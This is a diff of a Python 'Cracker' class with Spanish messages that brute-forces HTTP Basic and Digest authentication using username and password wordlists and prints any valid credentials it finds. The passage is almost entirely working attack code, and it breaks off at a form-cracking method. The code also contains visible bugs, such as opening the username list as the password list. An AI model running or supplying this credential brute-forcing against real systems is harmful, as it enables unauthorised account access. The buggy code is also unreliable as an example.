@@ -1,44 +1,65 @@
-import requests
 import socket
 from requests.auth import HTTPBasicAuth, HTTPDigestAuth
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from htmlstructure import HTML
+from HTTPrequest import HTTPrequest
 from selenium import webdriver
 
 
-class Cracker:
-    def __init__(self, url):
+class Cracker(HTTPrequest):
+    def __init__(self, url,dictionary_user, dictionary_pass):
+        super().__init__()
         self.numrequests = 0
         self.urlattack = url
-        self.username=""
-        self.password=""
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+        self.dictusername=dictionary_user
+        self.dictpassword=dictionary_pass
 
-    def basicauthcrack(self, dictionary_user, dictionary_pass):
-        dictus=open(dictionary_user)
-        dictpass=open(dictionary_pass)
-        result=False
+    def basicauthcrack(self):
+        dictus=open(self.dictusername)
+        dictpass=open(self.dictusername)
+        exit=False
         for lineaus in dictus:
-            if result:
+            if exit:
                 break
             username=lineaus
             for lineapass in dictpass:
                 password=lineapass
-                response = requests.get(self.urlattack, auth=HTTPBasicAuth(username, password))
-                print(response)
+                request={'method':'get', 'url':self.urlattack,'auth':HTTPBasicAuth(username, password)}
+                response,result = self.request(request)
+                if result['status']<0:
+                    print('Error en la conexión')
+                    break
                 if response.status_code == 200:
-                    result=True
+                    exit=True
                     print('Usuario '+username+' y contraseña '+password+' válidos')
                     break
-        if not result:
+        if not exit:
             print('Ningún usuario y contraseña válidos')
         dictus.close()
         dictpass.close()
 
-    def digestauthcrack(self, username, password):
-        response = requests.get(self.urlattack, auth=HTTPDigestAuth(username, password))
-        if response.status_code == 200:
-            print('Usuario y contraseña válidos')
+    def digestauthcrack(self):
+        dictus = open(self.dictusername)
+        dictpass = open(self.dictusername)
+        exit = False
+        for lineaus in dictus:
+            if exit:
+                break
+            username = lineaus
+            for lineapass in dictpass:
+                password = lineapass
+                request = {'method': 'get', 'url': self.urlattack, 'auth': HTTPDigestAuth(username, password)}
+                response, result = self.request(request)
+                if result['status'] < 0:
+                    print('Error en la conexión')
+                    break
+                if response.status_code == 200:
+                    exit = True
+                    print('Usuario ' + username + ' y contraseña ' + password + ' válidos')
+                    break
+        if not exit:
+            print('Ningún usuario y contraseña válidos')
+        dictus.close()
+        dictpass.close()
 
     def formcrack(self, username, password):
         result = {'status': 0}
